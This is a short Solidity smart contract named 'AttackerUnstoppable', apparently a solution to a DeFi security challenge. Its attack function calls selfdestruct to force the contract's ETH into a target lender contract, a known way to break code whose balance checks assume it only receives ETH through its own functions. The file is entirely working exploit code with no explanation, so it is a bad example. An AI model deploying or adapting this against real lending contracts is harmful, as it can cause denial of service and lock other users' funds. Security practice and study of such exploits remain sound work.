// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackerUnstoppable {
    function attack(address payable _lender) public {
        require(address(this).balance > 0, 'Contarct must have some ETH funds to perform attack');
        selfdestruct(_lender);
    }
}